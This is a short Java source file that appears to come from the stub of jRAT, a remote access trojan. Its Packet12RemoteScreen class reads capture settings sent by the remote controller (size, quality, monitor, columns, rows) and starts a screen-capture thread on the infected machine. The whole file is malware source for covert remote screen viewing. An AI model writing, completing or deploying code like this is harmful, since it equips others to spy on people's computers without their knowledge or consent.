package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;
import se.jrat.stub.Screen;

public class Packet12RemoteScreen extends AbstractIncomingPacket {
	
	@Override
	public void read(Connection con) throws Exception {
		int size = Connection.instance.readInt();
		int quality = Connection.instance.readInt();
		int monitor = Connection.instance.readInt();
		int columns = Connection.instance.readInt();
		int rows = Connection.instance.readInt();
		
		new Screen(size, quality, monitor, columns, rows).start();
	}

}
